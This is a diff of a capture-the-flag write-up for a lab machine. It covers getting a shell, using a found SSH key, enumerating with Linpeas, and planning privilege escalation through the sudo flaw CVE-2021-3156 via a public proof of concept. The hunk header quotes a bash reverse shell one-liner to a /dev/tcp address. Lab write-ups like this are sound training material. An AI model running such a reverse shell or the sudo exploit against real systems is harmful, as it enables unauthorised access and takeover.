@@ -163,13 +163,21 @@ bash -c "bash -i >& /dev/tcp/10.18.81.1/14632 0>&1"
 
 After obtaining a shell, I discovered an "id_rsa" file, which I utilized to establish a more stable shell.
 Subsequently, I attempted to exec Linpeas on the server to conduct further enumeration and analysis.
+
+```bash
+bismuth@catpictures-ii:~$ ls
+flag2.txt
+```
+
 </br>
+## Priv-Esc
+
+
 we have a vulnerable sudo version here.
 After patiently waiting during the Linpeas scan, I stumbled upon an interesting CVE (Common Vulnerabilities and Exposures) in the target machine. To gather more information, I conducted a Google search and came across a GitHub proof-of-concept ([! POC](https://github.com/blasty/CVE-2021-3156)) related to the discovered vulnerability.
 
 </br>
 
-## Priv-Esc
 
 Let's set up a Python3 server to share the CVE details with the target.
 
